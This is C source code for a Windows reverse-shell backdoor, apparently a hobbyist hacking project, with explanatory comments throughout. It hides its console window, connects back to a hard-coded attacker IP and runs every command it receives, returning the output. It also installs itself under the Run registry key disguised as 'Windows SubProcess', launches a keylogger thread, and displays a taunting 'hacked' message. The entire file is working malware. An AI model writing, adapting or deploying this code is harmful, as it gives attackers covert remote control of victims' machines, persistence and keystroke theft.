#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "key_logger.c"
#include "string_cut.c"

#define bzero(p) (void)memset(p, 0, sizeof(p));

int sock;


int bootRun()
{
    // creating error/success string in order to send it to server
    char error[128] = "Failed\n";
    char success[128] = "Created at : HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";

    TCHAR szPath[MAX_PATH]; // 
    /* 
    * TCHAR => is basically windows 32 bit charecter string that cah be used to describe unicode.. strings
    * MAX_PATH => is maximum path length limitation on windows 10 , it is 260 charecters
    * */

    DWORD pathLen = 0; // DWORD => it is a short for "double word" , it is a datatype that is an unsigned 32 unit of data and can contain an int value

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);

    if (pathLen == 0)
    {
        send(sock, error, sizeof(error), 0);
        return -1;
    }

    // creating a new registry key value
    HKEY NewVal; // and this value is a handle to a open registry key

    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != 0) // if it doesn't work then following
    {
        send(sock, error, sizeof(error), 0);
        return -1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);

    if (RegSetValueEx(NewVal, TEXT("Windows SubProcess"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != 0)// if it doesn't work then following
    {
        RegCloseKey(NewVal);
        send(sock, error, sizeof(error), 0);
        return -1;
    }

    RegCloseKey(NewVal);
    send(sock, success, sizeof(success), 0);
    return 0;
}


void Shell()
{
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1)
    {
    jump:
        bzero(buffer);
        bzero(container);
        bzero(total_response);
        recv(sock, buffer, 1024, 0);

        if (strncmp("exit",buffer, 4) == 0)
        {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        // else if (strncmp("close",buffer, 5) == 0)
        // {
        //     closesocket(sock);
        //     WSACleanup();
        // start:
        //     while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
        //     {
        //         Sleep(1);
        //         goto start;
        //     }
        // }

        else if (strncmp("cd ", buffer, 3) == 0)
        {
            chdir(str_cut(buffer, 3, 100));
        }
        else if (strncmp("persist", buffer, 7) == 0)
        {
            bootRun();
        }
        else if (strncmp("start_logger", buffer, 12) == 0)
        {
            // creating a new thread to handle the logger function indipendently with the main thread
            HANDLE thread;
            // creating a thread for the logger func
            thread = CreateThread(NULL, 0, logger, NULL, 0, NULL);
            goto jump;
        }
        else
        {
            FILE *fp;
            /* 
            opening the buffer as a process/task 
            so whatever stored in the buffer will ran as a certial process/task that the system should execute
            and storing the results in fp variable
             */
            fp = _popen(buffer, "r"); // by siimply we can say that read the buffer and execute it
            while (fgets(container, 1024, fp) != NULL)
            {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0); // sending the total response to server
            fclose(fp); // close the process
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int ncmdShow) // main entry function
{
    /* 
    hinstance is a handle to an instance or handle to module os uses to value to identify the executable when
    it is loaded in the memovry and hInstance handle is needed for some windows functions
     */
    // ipCmdLine argument has the unicode unix string
    // cmdShow it is just a flag that says the app will be minimised maximised or show normaly

    // hiding the window
    HWND stealth; // creating the handle to the window
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL); // FindWindowA will return the handle to the top level window , it takes two args 1=> class name , 2=> window name which is here NULL
    ShowWindow(stealth, 0); // it determines wheather we want to show the window or not

    // create the socket obj
    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData; // WSADATA is a structure that contain information about windows socket

    ServIP = "192.168.56.1"; // hacker machine ip addr
    ServPort = 50005; // port addr

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0); // AF_INET => using ipv4 , SOCK_STREAM => using tcp connection

    memset(&ServAddr, 0, sizeof(ServAddr)); // clearing the ServAddr memory with 0

    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); // inet_adrr is for to convert the string text to ip address format
    ServAddr.sin_port = htons(ServPort);          // htons for int to port format

start:
    while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
    {
        Sleep(10);// waiting for 10 milliseconds
        goto start;
    }

    // creating the beep sound
    MessageBeep(10);

    // creating a message box to prompt the user that it is been hacked [just for crazy..]
    MessageBox(NULL,TEXT("Your Device Has Been Hacked!!!"),TEXT("Do Not Play With Rohidh"),MB_OK | MB_ICONSTOP);

    // int i;
    // for(i=0;i<=10;i++)
    //     MessageBox(NULL,TEXT("Your Device Has Been Hacked!!!"),TEXT("HACKED BY ROHIDH KRISHNA"),MB_OK | MB_ICONERROR);
    // if (i==11)
    //     MessageBox(NULL,TEXT("Engane und?"),TEXT("HACKED BY ROHIDH"),MB_OK | MB_ICONERROR);

    Shell();
}
